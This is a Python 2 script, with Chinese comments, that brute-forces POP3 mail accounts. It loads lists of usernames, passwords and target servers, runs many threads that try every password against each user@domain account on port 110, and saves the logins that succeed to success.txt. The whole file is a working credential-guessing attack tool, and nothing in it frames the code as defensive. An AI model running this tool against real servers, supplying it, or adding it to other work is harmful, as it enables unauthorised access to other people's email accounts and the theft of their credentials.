# coding=utf-8
import threading
import poplib
import time
import optparse
import sys
port = 110  # pop3对应110
delay = 0.2  # 延时,设为0.1可能会有漏报,0.2以上基本不会漏报
success = []
usernames = []
passwords = []
servers = []
usersst = []
threadLock = threading.Lock()


def checkserver(server):
    # 检查连接
    try:
        pp = poplib.POP3(server, port, 2)
        return True
    except:
        return False


def strprocessing():
    # 字符处理
    users = open(usernamedic, 'r').readlines()
    pwds = open(passworddic, 'r').readlines()
    tars = open(serverdic, 'r').readlines()
    for item in pwds:
        item = item.replace("\n", "")
        passwords.append(item)
    for item in tars:
        item = item.replace("\n", "")
        print item
        servers.append(item)
    for item in users:
        usersst.append(item)


class myThread (threading.Thread):

    def __init__(self, username, passwords, server):
        threading.Thread.__init__(self)
        self.username = username
        self.passwords = passwords
        self.server = server

    def run(self):
        selfpass = self.passwords
        for password in selfpass:
            try:  # 登录
                threadLock.acquire()
                print self.username, password
                threadLock.release()
                pop = poplib.POP3(self.server, port, delay)
                pop.user(self.username)
                auth = pop.pass_(password)
                print self.username, password, auth[1:3]
                success.append(self.username + ':' + password + "\n")
                pop.quit()
            except:
                pass
            finally:
                pass
               #threadLock.release()


def startsubbrute(server):
    # 执行多线程
    n = 0
    while n < len(usernames):
        try:
            for i in range(tnumbers):
                t = myThread(usernames[n], passwords, server)
                n = n + 1
                t.start()

            t.join()
            # print 'compelet:'+str(n)+'/'+str(len(usernames))
        except:
            pass


def startmainbrute():
    # 任务分配逻辑
    strprocessing()  # 处理字符串
    for server in servers:
        index = server.find('.')
        if checkserver(server):  # 检测连接是否正常
            for item in usersst:
                item = item.replace("\n", '@' + server[index + 1:])
                usernames.append(item)
            print 'Bruting ' + server
           # threadLock.acquire ()
            startsubbrute(server)
           # threadLock.release()
        else:
            print "Can't connection"
        del usernames[:]
    if len(success) != 0:
        f = open('success.txt', 'w')
        f.writelines(success)
        f.close()

if __name__ == '__main__':
    parser = optparse.OptionParser('usage: %prog [options] target')
    parser.add_option('-t', '--threads', dest='threads_num',
                      default=50, type='int',
                      help='Number of threads. default = 50')
    parser.add_option('-l', '--username', dest='names_file', default='names',
                      type='string', help='Dict username used to brute pop3')
    parser.add_option('-p', '--password', dest='password_file', default='passwords',
                      type='string', help='Dict password used to brute pop3')
    parser.add_option('-s', '--servers', dest='servers_file', default='servers',
                      type='string', help='Brute servers list ')
    (options, args) = parser.parse_args()
    # if len(args) < 1:
    #    parser.print_help()
    #    sys.exit(0)
    tnumbers = options.threads_num  # 线程数
    usernamedic = options.names_file  # 用户名字典
    passworddic = options.password_file  # 密码字典
    serverdic = options.servers_file  # 目标
    startmainbrute()
